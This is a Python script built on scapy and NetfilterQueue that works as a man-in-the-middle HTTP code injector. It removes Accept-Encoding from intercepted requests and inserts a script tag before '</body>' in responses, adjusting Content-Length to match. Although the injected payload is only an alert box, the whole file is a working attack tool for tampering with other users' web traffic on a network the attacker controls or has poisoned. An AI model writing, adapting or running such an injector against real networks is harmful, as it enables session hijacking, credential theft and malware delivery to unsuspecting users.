#!/usr/bin/python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import re

def processing_code_injector(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Http Request...")
            load = re.sub("Accept-Encoding:.*?\\n", "", scapy_packet[scapy.Raw].load.decode())
            scapy_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(scapy_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Http Response...")
            scapy_load = scapy_packet[scapy.Raw].load.decode('latin1')
            scapy_load = scapy_load.replace("</body>", script + "</body>")
            print(scapy_packet.show())
            scapy_packet = set_load(scapy_packet, scapy_load)
            packet.set_payload(bytes(scapy_packet))

            if "Content-Length:" in scapy_packet[scapy.Raw].load.decode():
                content_length = re.search("(?:Content-Length:\s)(\d*)", scapy_packet[scapy.Raw].load.decode())[1]
                script_len = len(script)
                new_content_length = int(content_length) + script_len
                scapy_load = scapy_packet[scapy.Raw].load.decode()
                scapy_load = scapy_load.replace(content_length, str(new_content_length))
                scapy_packet = set_load(scapy_packet, scapy_load)
                packet.set_payload(bytes(scapy_packet))
                print(scapy_packet.show())
                print(content_length)
                print(script_len)
                print(new_content_length)
    packet.accept()

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

script = "<script>alert('Poda');</script>"

try:
    queue = NetfilterQueue()
    queue.bind(1, processing_code_injector)
    queue.run()
except KeyboardInterrupt:
    print("Quitting program")